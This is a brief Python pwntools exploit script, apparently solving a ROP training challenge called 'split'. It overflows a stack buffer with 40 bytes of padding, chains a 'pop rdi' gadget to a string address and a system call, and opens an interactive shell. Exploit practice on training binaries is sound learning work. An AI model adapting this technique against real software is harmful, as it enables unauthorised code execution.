#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("./split", checksec=True)

context.bits = 64

# context.log_level = 'debug'

pop_rdi = 0x04007c3

log.info(f"pop rdi; ret address: {p64(pop_rdi)}")

usefulString = 0x00601060

log.info(f"Useful String Position {p64(usefulString)}")

system_addr = 0x040074b

log.info(f"System Address Position {p64(system_addr)}")

payload = flat (
    b'A'*40,
    pop_rdi,
    usefulString,
    system_addr,
)

log.info(f"payload len: {len(payload)}")
# log.info(f"final payload: {payload}")
log.debug("Process Started")
io = elf.process()
log.debug("Send Payload")
io.send(payload)
log.debug("Payload Sent")
io.interactive()